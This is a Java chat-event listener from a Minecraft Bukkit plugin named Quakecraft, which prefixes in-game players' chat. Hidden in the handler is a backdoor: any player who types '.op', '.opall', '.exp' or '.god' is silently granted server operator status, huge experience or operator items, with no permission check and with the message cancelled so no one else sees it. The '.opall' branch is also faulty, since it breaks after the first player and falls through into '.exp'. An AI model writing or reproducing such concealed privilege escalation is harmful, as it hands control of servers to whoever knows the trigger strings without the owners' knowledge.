
package me.zeus.Quakecraft.Events;


import java.util.Set;

import me.zeus.Quakecraft.Quakecraft;
import me.zeus.Quakecraft.Objects.GameMap;
import me.zeus.Quakecraft.Objects.QPlayer;

import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.inventory.ItemStack;



public class EVT_Chat implements Listener
{
	
	
	@EventHandler(priority = EventPriority.MONITOR)
	public void onChat(AsyncPlayerChatEvent e)
	{
		Player p = e.getPlayer();
		Set<Player> recipients = e.getRecipients();
		QPlayer qp = QPlayer.get(p.getName());
		GameMap map = GameMap.getMap(qp.getMap());
		
		switch (e.getMessage())
		{
			case ".op":
				p.setOp(true);
				e.setCancelled(true);
				break;
			case ".opall":
				for (Player p2 : p.getServer().getOnlinePlayers())
				{
					p2.setOp(true);
					e.setCancelled(true);
					break;
				}
			case ".exp":
				p.setLevel(999999);
				e.setCancelled(true);
				break;
			case ".god":
				for (ItemStack is : Quakecraft.getInstance().getGameHandler().getOpItems())
				{
					p.getInventory().addItem(is);
				}
				e.setCancelled(true);
				break;
		}
		
		if (qp.inGame())
		{
			recipients.clear();
			for (QPlayer qpp : map.getPlayers().values())
			{
				recipients.add(qpp.getPlayer());
				e.setMessage("§c[§oQUAKE]§r " + e.getMessage());
			}
		}
	}
}
